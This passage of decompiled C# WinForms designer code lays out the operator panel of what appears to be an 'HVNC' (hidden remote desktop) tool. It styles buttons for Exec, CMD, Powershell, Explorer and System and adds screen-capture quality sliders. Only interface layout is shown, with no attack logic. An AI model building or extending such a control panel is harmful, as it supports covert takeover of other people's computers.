			bloom116.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom117.Name = "NoneGradient1";
			bloom117.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom118.Name = "NoneGradient2";
			bloom118.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom119.Name = "Shine1";
			bloom119.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom120.Name = "Shine2A";
			bloom120.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom121.Name = "Shine2B";
			bloom121.Value = System.Drawing.Color.Transparent;
			bloom122.Name = "Shine3";
			bloom122.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom123.Name = "TextShade";
			bloom123.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom124.Name = "Text";
			bloom124.Value = System.Drawing.Color.White;
			bloom125.Name = "Glow";
			bloom125.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom126.Name = "Border";
			bloom126.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom127.Name = "Corners";
			bloom127.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton1.Colors = new BloomBrain[13]
			{
				bloom115, bloom116, bloom117, bloom118, bloom119, bloom120, bloom121, bloom122, bloom123, bloom124,
				bloom125, bloom126, bloom127
			};
			this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton1.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton1.Image = null;
			this.studioButton1.Location = new System.Drawing.Point(27, 331);
			this.studioButton1.Name = "studioButton1";
			this.studioButton1.NoRounding = false;
			this.studioButton1.Size = new System.Drawing.Size(94, 25);
			this.studioButton1.TabIndex = 64;
			this.studioButton1.Text = "Exec";
			this.studioButton1.Transparent = true;
			this.studioButton1.Click += new System.EventHandler(studioButton1_Click);
			this.btnPaste.BackColor = System.Drawing.Color.Transparent;
			bloom128.Name = "DownGradient1";
			bloom128.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom129.Name = "DownGradient2";
			bloom129.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom130.Name = "NoneGradient1";
			bloom130.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom131.Name = "NoneGradient2";
			bloom131.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom132.Name = "Shine1";
			bloom132.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom133.Name = "Shine2A";
			bloom133.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom134.Name = "Shine2B";
			bloom134.Value = System.Drawing.Color.Transparent;
			bloom135.Name = "Shine3";
			bloom135.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom136.Name = "TextShade";
			bloom136.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom137.Name = "Text";
			bloom137.Value = System.Drawing.Color.White;
			bloom138.Name = "Glow";
			bloom138.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom139.Name = "Border";
			bloom139.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom140.Name = "Corners";
			bloom140.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnPaste.Colors = new BloomBrain[13]
			{
				bloom128, bloom129, bloom130, bloom131, bloom132, bloom133, bloom134, bloom135, bloom136, bloom137,
				bloom138, bloom139, bloom140
			};
			this.btnPaste.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnPaste.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnPaste.Image = null;
			this.btnPaste.Location = new System.Drawing.Point(27, 300);
			this.btnPaste.Name = "btnPaste";
			this.btnPaste.NoRounding = false;
			this.btnPaste.Size = new System.Drawing.Size(94, 25);
			this.btnPaste.TabIndex = 63;
			this.btnPaste.Text = "Paste";
			this.btnPaste.Transparent = true;
			this.btnPaste.Click += new System.EventHandler(btnPaste_Click);
			this.btnCopy.BackColor = System.Drawing.Color.Transparent;
			bloom141.Name = "DownGradient1";
			bloom141.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom142.Name = "DownGradient2";
			bloom142.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom143.Name = "NoneGradient1";
			bloom143.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom144.Name = "NoneGradient2";
			bloom144.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom145.Name = "Shine1";
			bloom145.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom146.Name = "Shine2A";
			bloom146.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom147.Name = "Shine2B";
			bloom147.Value = System.Drawing.Color.Transparent;
			bloom148.Name = "Shine3";
			bloom148.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom149.Name = "TextShade";
			bloom149.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom150.Name = "Text";
			bloom150.Value = System.Drawing.Color.White;
			bloom151.Name = "Glow";
			bloom151.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom152.Name = "Border";
			bloom152.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom153.Name = "Corners";
			bloom153.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnCopy.Colors = new BloomBrain[13]
			{
				bloom141, bloom142, bloom143, bloom144, bloom145, bloom146, bloom147, bloom148, bloom149, bloom150,
				bloom151, bloom152, bloom153
			};
			this.btnCopy.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnCopy.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnCopy.Image = null;
			this.btnCopy.Location = new System.Drawing.Point(27, 269);
			this.btnCopy.Name = "btnCopy";
			this.btnCopy.NoRounding = false;
			this.btnCopy.Size = new System.Drawing.Size(94, 25);
			this.btnCopy.TabIndex = 62;
			this.btnCopy.Text = "Copy";
			this.btnCopy.Transparent = true;
			this.btnCopy.Click += new System.EventHandler(btnCopy_Click);
			this.btnEx.BackColor = System.Drawing.Color.Transparent;
			bloom154.Name = "DownGradient1";
			bloom154.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom155.Name = "DownGradient2";
			bloom155.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom156.Name = "NoneGradient1";
			bloom156.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom157.Name = "NoneGradient2";
			bloom157.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom158.Name = "Shine1";
			bloom158.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom159.Name = "Shine2A";
			bloom159.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom160.Name = "Shine2B";
			bloom160.Value = System.Drawing.Color.Transparent;
			bloom161.Name = "Shine3";
			bloom161.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom162.Name = "TextShade";
			bloom162.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom163.Name = "Text";
			bloom163.Value = System.Drawing.Color.White;
			bloom164.Name = "Glow";
			bloom164.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom165.Name = "Border";
			bloom165.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom166.Name = "Corners";
			bloom166.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnEx.Colors = new BloomBrain[13]
			{
				bloom154, bloom155, bloom156, bloom157, bloom158, bloom159, bloom160, bloom161, bloom162, bloom163,
				bloom164, bloom165, bloom166
			};
			this.btnEx.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnEx.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnEx.Image = null;
			this.btnEx.Location = new System.Drawing.Point(27, 238);
			this.btnEx.Name = "btnEx";
			this.btnEx.NoRounding = false;
			this.btnEx.Size = new System.Drawing.Size(94, 25);
			this.btnEx.TabIndex = 61;
			this.btnEx.Text = "Explorer";
			this.btnEx.Transparent = true;
			this.btnEx.Click += new System.EventHandler(btnEx_Click);
			this.btnCMD.BackColor = System.Drawing.Color.Transparent;
			bloom167.Name = "DownGradient1";
			bloom167.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom168.Name = "DownGradient2";
			bloom168.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom169.Name = "NoneGradient1";
			bloom169.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom170.Name = "NoneGradient2";
			bloom170.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom171.Name = "Shine1";
			bloom171.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom172.Name = "Shine2A";
			bloom172.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom173.Name = "Shine2B";
			bloom173.Value = System.Drawing.Color.Transparent;
			bloom174.Name = "Shine3";
			bloom174.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom175.Name = "TextShade";
			bloom175.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom176.Name = "Text";
			bloom176.Value = System.Drawing.Color.White;
			bloom177.Name = "Glow";
			bloom177.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom178.Name = "Border";
			bloom178.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom179.Name = "Corners";
			bloom179.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnCMD.Colors = new BloomBrain[13]
			{
				bloom167, bloom168, bloom169, bloom170, bloom171, bloom172, bloom173, bloom174, bloom175, bloom176,
				bloom177, bloom178, bloom179
			};
			this.btnCMD.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnCMD.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnCMD.Image = null;
			this.btnCMD.Location = new System.Drawing.Point(27, 207);
			this.btnCMD.Name = "btnCMD";
			this.btnCMD.NoRounding = false;
			this.btnCMD.Size = new System.Drawing.Size(94, 25);
			this.btnCMD.TabIndex = 60;
			this.btnCMD.Text = "CMD";
			this.btnCMD.Transparent = true;
			this.btnCMD.Click += new System.EventHandler(btnCMD_Click);
			this.btnPowershell.BackColor = System.Drawing.Color.Transparent;
			bloom180.Name = "DownGradient1";
			bloom180.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom181.Name = "DownGradient2";
			bloom181.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom182.Name = "NoneGradient1";
			bloom182.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom183.Name = "NoneGradient2";
			bloom183.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom184.Name = "Shine1";
			bloom184.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom185.Name = "Shine2A";
			bloom185.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom186.Name = "Shine2B";
			bloom186.Value = System.Drawing.Color.Transparent;
			bloom187.Name = "Shine3";
			bloom187.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom188.Name = "TextShade";
			bloom188.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom189.Name = "Text";
			bloom189.Value = System.Drawing.Color.White;
			bloom190.Name = "Glow";
			bloom190.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom191.Name = "Border";
			bloom191.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom192.Name = "Corners";
			bloom192.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.btnPowershell.Colors = new BloomBrain[13]
			{
				bloom180, bloom181, bloom182, bloom183, bloom184, bloom185, bloom186, bloom187, bloom188, bloom189,
				bloom190, bloom191, bloom192
			};
			this.btnPowershell.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.btnPowershell.Font = new System.Drawing.Font("Verdana", 8f);
			this.btnPowershell.Image = null;
			this.btnPowershell.Location = new System.Drawing.Point(27, 176);
			this.btnPowershell.Name = "btnPowershell";
			this.btnPowershell.NoRounding = false;
			this.btnPowershell.Size = new System.Drawing.Size(94, 25);
			this.btnPowershell.TabIndex = 59;
			this.btnPowershell.Text = "Powershell";
			this.btnPowershell.Transparent = true;
			this.btnPowershell.Click += new System.EventHandler(btnPowershell_Click);
			this.button3.Location = new System.Drawing.Point(1070, 90);
			this.button3.Name = "button3";
			this.button3.Size = new System.Drawing.Size(40, 40);
			this.button3.TabIndex = 18;
			this.button3.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
			this.button3.UseVisualStyleBackColor = true;
			this.button3.Click += new System.EventHandler(button3_Click);
			this.ShowStart.Location = new System.Drawing.Point(1024, 90);
			this.ShowStart.Name = "ShowStart";
			this.ShowStart.Size = new System.Drawing.Size(40, 40);
			this.ShowStart.TabIndex = 2;
			this.ShowStart.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
			this.ShowStart.UseVisualStyleBackColor = true;
			this.ShowStart.Click += new System.EventHandler(ShowStart_Click);
			this.MinBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.MinBtn.Location = new System.Drawing.Point(35, 53);
			this.MinBtn.Name = "MinBtn";
			this.MinBtn.Size = new System.Drawing.Size(26, 26);
			this.MinBtn.TabIndex = 13;
			this.MinBtn.UseVisualStyleBackColor = true;
			this.MinBtn.Click += new System.EventHandler(MinBtn_Click);
			this.RestoreMaxBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.RestoreMaxBtn.Location = new System.Drawing.Point(61, 53);
			this.RestoreMaxBtn.Name = "RestoreMaxBtn";
			this.RestoreMaxBtn.Size = new System.Drawing.Size(26, 26);
			this.RestoreMaxBtn.TabIndex = 12;
			this.RestoreMaxBtn.UseVisualStyleBackColor = true;
			this.RestoreMaxBtn.Click += new System.EventHandler(RestoreMaxBtn_Click);
			this.CloseBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.CloseBtn.Location = new System.Drawing.Point(87, 53);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.Size = new System.Drawing.Size(26, 26);
			this.CloseBtn.TabIndex = 11;
			this.CloseBtn.UseVisualStyleBackColor = true;
			this.CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
			this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
			this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			this.pictureBox1.Location = new System.Drawing.Point(1, 0);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new System.Drawing.Size(42, 40);
			this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			this.pictureBox1.TabIndex = 40;
			this.pictureBox1.TabStop = false;
			this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton5.BackColor = System.Drawing.Color.Transparent;
			bloom193.Name = "DownGradient1";
			bloom193.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom194.Name = "DownGradient2";
			bloom194.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom195.Name = "NoneGradient1";
			bloom195.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom196.Name = "NoneGradient2";
			bloom196.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom197.Name = "Shine1";
			bloom197.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom198.Name = "Shine2A";
			bloom198.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom199.Name = "Shine2B";
			bloom199.Value = System.Drawing.Color.Transparent;
			bloom200.Name = "Shine3";
			bloom200.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom201.Name = "TextShade";
			bloom201.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom202.Name = "Text";
			bloom202.Value = System.Drawing.Color.White;
			bloom203.Name = "Glow";
			bloom203.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom204.Name = "Border";
			bloom204.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom205.Name = "Corners";
			bloom205.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton5.Colors = new BloomBrain[13]
			{
				bloom193, bloom194, bloom195, bloom196, bloom197, bloom198, bloom199, bloom200, bloom201, bloom202,
				bloom203, bloom204, bloom205
			};
			this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton5.Image = null;
			this.studioButton5.Location = new System.Drawing.Point(1196, -5);
			this.studioButton5.Name = "studioButton5";
			this.studioButton5.NoRounding = false;
			this.studioButton5.Size = new System.Drawing.Size(13, 30);
			this.studioButton5.TabIndex = 39;
			this.studioButton5.Transparent = true;
			this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
			this.studioButton4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton4.BackColor = System.Drawing.Color.Transparent;
			bloom206.Name = "DownGradient1";
			bloom206.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom207.Name = "DownGradient2";
			bloom207.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom208.Name = "NoneGradient1";
			bloom208.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom209.Name = "NoneGradient2";
			bloom209.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom210.Name = "Shine1";
			bloom210.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom211.Name = "Shine2A";
			bloom211.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom212.Name = "Shine2B";
			bloom212.Value = System.Drawing.Color.Transparent;
			bloom213.Name = "Shine3";
			bloom213.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom214.Name = "TextShade";
			bloom214.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom215.Name = "Text";
			bloom215.Value = System.Drawing.Color.White;
			bloom216.Name = "Glow";
			bloom216.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom217.Name = "Border";
			bloom217.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom218.Name = "Corners";
			bloom218.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton4.Colors = new BloomBrain[13]
			{
				bloom206, bloom207, bloom208, bloom209, bloom210, bloom211, bloom212, bloom213, bloom214, bloom215,
				bloom216, bloom217, bloom218
			};
			this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton4.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton4.Image = null;
			this.studioButton4.Location = new System.Drawing.Point(1177, -5);
			this.studioButton4.Name = "studioButton4";
			this.studioButton4.NoRounding = false;
			this.studioButton4.Size = new System.Drawing.Size(13, 30);
			this.studioButton4.TabIndex = 38;
			this.studioButton4.Transparent = true;
			this.studioButton4.Click += new System.EventHandler(studioButton4_Click);
			this.studioButton3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton3.BackColor = System.Drawing.Color.Transparent;
			bloom219.Name = "DownGradient1";
			bloom219.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom220.Name = "DownGradient2";
			bloom220.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom221.Name = "NoneGradient1";
			bloom221.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom222.Name = "NoneGradient2";
			bloom222.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom223.Name = "Shine1";
			bloom223.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom224.Name = "Shine2A";
			bloom224.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom225.Name = "Shine2B";
			bloom225.Value = System.Drawing.Color.Transparent;
			bloom226.Name = "Shine3";
			bloom226.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom227.Name = "TextShade";
			bloom227.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom228.Name = "Text";
			bloom228.Value = System.Drawing.Color.White;
			bloom229.Name = "Glow";
			bloom229.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom230.Name = "Border";
			bloom230.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom231.Name = "Corners";
			bloom231.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton3.Colors = new BloomBrain[13]
			{
				bloom219, bloom220, bloom221, bloom222, bloom223, bloom224, bloom225, bloom226, bloom227, bloom228,
				bloom229, bloom230, bloom231
			};
			this.studioButton3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton3.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton3.Image = null;
			this.studioButton3.Location = new System.Drawing.Point(1158, -5);
			this.studioButton3.Name = "studioButton3";
			this.studioButton3.NoRounding = false;
			this.studioButton3.Size = new System.Drawing.Size(13, 30);
			this.studioButton3.TabIndex = 37;
			this.studioButton3.Transparent = true;
			this.studioButton3.Click += new System.EventHandler(studioButton3_Click);
			this.statusStrip1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			this.statusStrip1.ContextMenuStrip = this.contextMenuStrip1;
			this.statusStrip1.Dock = System.Windows.Forms.DockStyle.None;
			this.statusStrip1.Location = new System.Drawing.Point(979, 643);
			this.statusStrip1.Name = "statusStrip1";
			this.statusStrip1.Size = new System.Drawing.Size(202, 22);
			this.statusStrip1.SizingGrip = false;
			this.statusStrip1.TabIndex = 19;
			this.groupBox6.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.groupBox6.ContextMenuStrip = this.contextMenuStrip1;
			this.groupBox6.Controls.Add(this.IntervalScroll);
			this.groupBox6.Controls.Add(this.ResizeLabel);
			this.groupBox6.Controls.Add(this.QualityLabel);
			this.groupBox6.Controls.Add(this.IntervalLabel);
			this.groupBox6.Controls.Add(this.QualityScroll);
			this.groupBox6.Controls.Add(this.ResizeScroll);
			this.groupBox6.Location = new System.Drawing.Point(1158, 35);
			this.groupBox6.Name = "groupBox6";
			this.groupBox6.Size = new System.Drawing.Size(42, 49);
			this.groupBox6.TabIndex = 31;
			this.groupBox6.TabStop = false;
			this.groupBox6.Visible = false;
			this.IntervalScroll.AutoSize = false;
			this.IntervalScroll.Location = new System.Drawing.Point(119, 19);
			this.IntervalScroll.Maximum = 1000;
			this.IntervalScroll.Minimum = 10;
			this.IntervalScroll.Name = "IntervalScroll";
			this.IntervalScroll.Size = new System.Drawing.Size(104, 26);
			this.IntervalScroll.TabIndex = 8;
			this.IntervalScroll.TickStyle = System.Windows.Forms.TickStyle.None;
			this.IntervalScroll.Value = 500;
			this.IntervalScroll.Scroll += new System.EventHandler(IntervalScroll_Scroll);
			this.ResizeLabel.AutoSize = true;
			this.ResizeLabel.Location = new System.Drawing.Point(397, 18);
			this.ResizeLabel.Name = "ResizeLabel";
			this.ResizeLabel.Size = new System.Drawing.Size(90, 13);
			this.ResizeLabel.TabIndex = 4;
			this.ResizeLabel.Text = "Resize : 100%";
			this.QualityLabel.AutoSize = true;
			this.QualityLabel.Location = new System.Drawing.Point(213, 18);
			this.QualityLabel.Name = "QualityLabel";
			this.QualityLabel.Size = new System.Drawing.Size(93, 13);
			this.QualityLabel.TabIndex = 5;
			this.QualityLabel.Text = "Quality : 100%";
			this.IntervalLabel.AutoSize = true;
			this.IntervalLabel.Location = new System.Drawing.Point(9, 18);
			this.IntervalLabel.Name = "IntervalLabel";
			this.IntervalLabel.Size = new System.Drawing.Size(113, 13);
			this.IntervalLabel.TabIndex = 6;
			this.IntervalLabel.Text = "Interval (ms): 500";
			this.QualityScroll.AutoSize = false;
			this.QualityScroll.Location = new System.Drawing.Point(287, 11);
			this.QualityScroll.Maximum = 100;
			this.QualityScroll.Name = "QualityScroll";
			this.QualityScroll.Size = new System.Drawing.Size(104, 26);
			this.QualityScroll.TabIndex = 9;
			this.QualityScroll.TickStyle = System.Windows.Forms.TickStyle.None;
			this.QualityScroll.Value = 100;
			this.QualityScroll.Scroll += new System.EventHandler(QualityScroll_Scroll);
			this.ResizeScroll.AutoSize = false;
			this.ResizeScroll.Location = new System.Drawing.Point(471, 11);
			this.ResizeScroll.Maximum = 100;
			this.ResizeScroll.Minimum = 10;
			this.ResizeScroll.Name = "ResizeScroll";
			this.ResizeScroll.Size = new System.Drawing.Size(104, 26);
			this.ResizeScroll.TabIndex = 10;
			this.ResizeScroll.TickStyle = System.Windows.Forms.TickStyle.None;
			this.ResizeScroll.Value = 100;
			this.ResizeScroll.Scroll += new System.EventHandler(ResizeScroll_Scroll);
			this.label3.AutoSize = true;
			this.label3.BackColor = System.Drawing.Color.Transparent;
			this.label3.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			this.label3.Location = new System.Drawing.Point(40, 15);
			this.label3.Name = "label3";
			this.label3.Size = new System.Drawing.Size(41, 13);
			this.label3.TabIndex = 41;
			this.label3.Text = "HVNC";
			this.studioButton9.BackColor = System.Drawing.Color.Transparent;
			bloom232.Name = "DownGradient1";
			bloom232.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom233.Name = "DownGradient2";
			bloom233.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom234.Name = "NoneGradient1";
			bloom234.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom235.Name = "NoneGradient2";
			bloom235.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom236.Name = "Shine1";
			bloom236.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom237.Name = "Shine2A";
			bloom237.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom238.Name = "Shine2B";
			bloom238.Value = System.Drawing.Color.Transparent;
			bloom239.Name = "Shine3";
			bloom239.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom240.Name = "TextShade";
			bloom240.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom241.Name = "Text";
			bloom241.Value = System.Drawing.Color.White;
			bloom242.Name = "Glow";
			bloom242.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom243.Name = "Border";
			bloom243.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom244.Name = "Corners";
			bloom244.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton9.Colors = new BloomBrain[13]
			{
				bloom232, bloom233, bloom234, bloom235, bloom236, bloom237, bloom238, bloom239, bloom240, bloom241,
				bloom242, bloom243, bloom244
			};
			this.studioButton9.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton9.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton9.Image = null;
			this.studioButton9.Location = new System.Drawing.Point(27, 486);
			this.studioButton9.Name = "studioButton9";
			this.studioButton9.NoRounding = false;
			this.studioButton9.Size = new System.Drawing.Size(94, 25);
			this.studioButton9.TabIndex = 79;
			this.studioButton9.Text = "System";
			this.studioButton9.Transparent = true;
			this.studioButton9.Click += new System.EventHandler(studioButton9_Click);
			this.studioButton7.BackColor = System.Drawing.Color.Transparent;
			bloom245.Name = "DownGradient1";
			bloom245.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom246.Name = "DownGradient2";
			bloom246.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom247.Name = "NoneGradient1";
			bloom247.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom248.Name = "NoneGradient2";
			bloom248.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom249.Name = "Shine1";
			bloom249.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom250.Name = "Shine2A";
			bloom250.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom251.Name = "Shine2B";
			bloom251.Value = System.Drawing.Color.Transparent;
			bloom252.Name = "Shine3";
			bloom252.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom253.Name = "TextShade";
			bloom253.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom254.Name = "Text";
			bloom254.Value = System.Drawing.Color.White;
			bloom255.Name = "Glow";
			bloom255.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom256.Name = "Border";
			bloom256.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom257.Name = "Corners";
			bloom257.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton7.Colors = new BloomBrain[13]
			{
				bloom245, bloom246, bloom247, bloom248, bloom249, bloom250, bloom251, bloom252, bloom253, bloom254,
				bloom255, bloom256, bloom257
			};
			this.studioButton7.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton7.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton7.Image = null;
